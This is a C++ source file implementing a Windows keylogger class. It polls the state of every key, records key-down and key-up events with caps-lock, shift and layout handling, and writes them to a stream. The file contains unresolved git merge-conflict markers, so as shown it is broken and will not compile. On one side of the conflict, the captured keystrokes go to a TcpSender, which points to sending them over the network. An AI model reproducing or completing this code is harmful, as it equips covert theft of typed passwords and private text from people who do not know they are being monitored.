#include "KeyLogger.h"
#include "Key.h"

KeyLogger::KeyLogger() : _keysState(256, false), _keysIgnored(256, false){
    if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0)
        _is_capsLook = true;
    else
        _is_capsLook = false;

    //Dublicate RSHIFT, LSHIFT, RCONTROL, LCONTROL ...
    _keysIgnored[VK_SHIFT] = true;
    _keysIgnored[VK_CONTROL] = true;
    _keysIgnored[VK_MENU] = true;
}

<<<<<<< Updated upstream
void KeyLogger::WriteEventKeys(ostream& buf)
=======
void KeyLogger::WriteEventKeys(TcpSender* sender)
>>>>>>> Stashed changes
{	
    bool isEn = (LOWORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0))) == 0x409);
    for (int key = 0; key < 255; key++) {
        //Key down
        if (LOWORD(GetAsyncKeyState(key))) {
            if (!_keysState[key]) {

                string stringKey = KeyToString(key, _is_capsLook, isEn, _keysState[VK_SHIFT]);

                //Caps lock
                if (key == VK_CAPITAL){
                   _is_capsLook = !_is_capsLook;
                }

                _keysState[key] = 1;

                if (_keysIgnored[key]){
                    continue;
                }

<<<<<<< Updated upstream
                buf << stringKey << " ";

=======
                *sender << stringKey + "";
>>>>>>> Stashed changes
			}
		}
		else {
            //Key up
            if (_keysState[key]) {
                string stringKey = KeyToString(key, _is_capsLook, isEn, _keysState[VK_SHIFT]);

                _keysState[key] = 0;

                if (_keysIgnored[key]){
                    continue;
                }

<<<<<<< Updated upstream
                buf << stringKey << "[UP] ";
=======
                *sender << stringKey + "[UP]";
>>>>>>> Stashed changes
            }
		}
	}
}

KeyLogger::~KeyLogger(){ }

